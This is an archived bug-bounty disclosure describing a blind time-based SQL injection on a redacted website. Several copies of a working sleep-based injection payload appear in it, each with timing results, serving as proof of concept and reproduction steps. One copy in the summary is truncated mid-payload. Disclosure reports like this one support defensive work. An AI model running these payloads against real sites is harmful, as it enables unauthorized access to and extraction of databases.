# Blind Sql Injection https:/████████

## Metadata
- **Source:** HackerOne
- **Report:** 2020429 | https://hackerone.com/reports/2020429
- **Submitted:** 2023-06-10
- **Reporter:** codeslayer1337
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
**Description:**
found on the websitehttps://████████ weakness is vulnerable to a blind sql injection.

POC: https:/█████████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
Tests Payload performed:
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
    0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
	0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
    0'XOR(if(now()=sysdate

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**
found on the websitehttps://████████ weakness is vulnerable to a blind sql injection.

POC: https:/█████████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
Tests Payload performed:
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
    0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
	0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
    0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
  
Best regards,
CodeSlayer137

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
